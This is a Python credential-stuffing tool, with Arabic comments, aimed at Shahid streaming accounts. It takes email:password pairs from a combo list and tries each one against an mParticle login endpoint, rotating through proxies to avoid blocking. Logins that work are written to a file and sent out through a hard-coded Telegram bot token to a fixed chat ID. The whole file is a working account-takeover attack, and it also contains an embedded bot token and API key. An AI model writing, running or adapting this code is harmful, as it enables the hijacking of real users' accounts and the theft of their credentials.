import os
import requests
import random
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

COMBO_FILE = "combo.txt"
PROXIES_FILE = "proxies.txt"
WORKING_HITS_FILE = "working_accounts.txt"

# إعدادات بوت التلجرام
TELEGRAM_BOT_TOKEN = "8842030147:AAGZ5CxMDafqTMckJ0_m267Wya5HNdHc8TU"
TELEGRAM_CHAT_ID = "1329113404"

def load_file(filename):
    if not os.path.exists(filename):
        return []
    with open(filename, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def send_telegram_alert(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, json=payload, timeout=5)
    except Exception:
        pass

def get_proxy_dict(proxy_line):
    if "://" not in proxy_line:
        proxy_line = f"http://{proxy_line}"
    return {
        "http": proxy_line,
        "https": proxy_line
    }

def test_proxy(proxy_line):
    test_url = "https://httpbin.org/ip"
    proxy_dict = get_proxy_dict(proxy_line)
    try:
        res = requests.get(test_url, proxies=proxy_dict, timeout=5)
        if res.status_code == 200:
            return True
    except:
        pass
    return False

def clean_and_check_proxies(proxies_list):
    print(f"[*] Checking {len(proxies_list)} proxies before starting...")
    valid_proxies = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        results = list(executor.map(lambda p: (p, test_proxy(p)), proxies_list))
    
    for p, is_valid in results:
        if is_valid:
            valid_proxies.append(p)
            
    print(f"[+] Active proxies ready: {len(valid_proxies)} / {len(proxies_list)}\n")
    return valid_proxies

def test_account(account_line, proxies_list):
    if ":" not in account_line:
        return
    email, password = account_line.split(":", 1)
    
    current_proxy = None
    if proxies_list:
        raw_proxy = random.choice(proxies_list)
        current_proxy = get_proxy_dict(raw_proxy)

    login_url = "https://identity.mparticle.com/v1/login"
    headers = {
        "authority": "identity.mparticle.com",
        "accept": "*/*",
        "accept-language": "ar;q=0.7",
        "content-type": "application/json",
        "origin": "https://shahid.mbc.net",
        "referer": "https://shahid.mbc.net/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
        "x-mp-key": "eu1-e3a52292f6e43646a56fcae52b187f58"
    }
    
    payload = {
        "email": email,
        "password": password,
        "environment": "production",
        "known_identities": {
            "email": email
        }
    }
    
    try:
        response = requests.post(login_url, json=payload, headers=headers, proxies=current_proxy, timeout=10)
        
        if response.status_code == 200:
            try:
                resp_json = response.json()
            except:
                resp_json = {}

            # الشرط المدقق لضمان أن الحساب شغال وحقيقي
            if resp_json.get("token") or resp_json.get("mpid") or (resp_json.get("is_logged_in") == True and "matched_identities" in resp_json):
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                hit_msg = f"[WORKING HIT] {email}:{password} | Time: {timestamp}"
                print(hit_msg)
                
                with open(WORKING_HITS_FILE, "a", encoding="utf-8") as hf:
                    hf.write(f"{email}:{password} | Checked at: {timestamp}\n")
                
                send_telegram_alert(f"🚨 <b>New Hit Found!</b>\n<code>{email}:{password}</code>\n⏰ <code>{timestamp}</code>")
            else:
                print(f"[INVALID] {email}")
        else:
            print(f"[BAD] {email} - Status: {response.status_code}")
                
    except requests.exceptions.RequestException:
        print(f"[ERROR] Connection failed for {email}")

def main():
    accounts = load_file(COMBO_FILE)
    raw_proxies = load_file(PROXIES_FILE)
    
    if not accounts:
        print("[!] قم بإضافة الحسابات داخل ملف combo.txt أولاً.")
        return
        
    print(f"[*] Loaded accounts: {len(accounts)}")
    
    valid_proxies = []
    if raw_proxies:
        valid_proxies = clean_and_check_proxies(raw_proxies)
    else:
        print("[!] تحذير: لا توجد بروكسيات في ملف proxies.txt، سيتم الفحص بدون بروكسي.")
        
    print(f"[*] Starting checking process with high speed...\n")
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        for account in accounts:
            executor.submit(test_account, account, valid_proxies)
            
    print(f"\n[+] Finished checking all accounts.")

if __name__ == "__main__":
    main()
